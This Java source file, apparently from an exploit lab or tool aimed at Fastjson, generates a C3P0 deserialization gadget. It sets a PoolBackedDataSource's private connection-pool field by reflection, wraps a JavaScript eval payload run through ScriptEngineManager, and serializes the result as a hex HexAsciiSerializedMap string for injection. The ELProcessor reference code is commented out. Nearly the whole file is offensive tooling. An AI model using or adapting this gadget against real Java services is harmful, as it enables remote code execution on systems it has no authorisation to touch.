package com.droplab.Controller.FastJson.Common;

import com.mchange.lang.ByteUtils;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
//import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * 用于获取C3P0序列化对象。
 */
public class C3P0SerializeObject {
    private static C3P0SerializeObject C3P0SerializeObject_=null;

    public static C3P0SerializeObject instance(){
        if (C3P0SerializeObject_ != null){
            //org.apache.catalina.connector.Request
        }else {
            C3P0SerializeObject_=new C3P0SerializeObject();
        }
        return C3P0SerializeObject_;
    }

    public byte[] getObject(String content){
        try {
            PoolBackedDataSource poolBackedDataSource = new PoolBackedDataSource();
            Field connectionPoolDataSource = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSource.setAccessible(true);
            connectionPoolDataSource.set(poolBackedDataSource,new PoolSource(content));
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(poolBackedDataSource);
            return byteArrayOutputStream.toByteArray();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public String getHexAsciiSerializedMap(byte[] source){
        StringBuffer sb = new StringBuffer();
        sb.append("HexAsciiSerializedMap");
        sb.append('[');
        sb.append(ByteUtils.toHexAscii(source));
        sb.append(']');
        return sb.toString();
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private final String payload="\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"%s\")";
        private String evalContent=null;

        public PoolSource(){}
        public PoolSource(String evalContent) {
            String replace = evalContent.replace("\"", "\\\"");
            this.evalContent = String.format(payload,replace);
        }

        public Reference getReference () throws NamingException {
            /*ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "a=eval"));
            ref.add(new StringRefAddr("a",evalContent));
            return ref;*/
            return null;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }
}
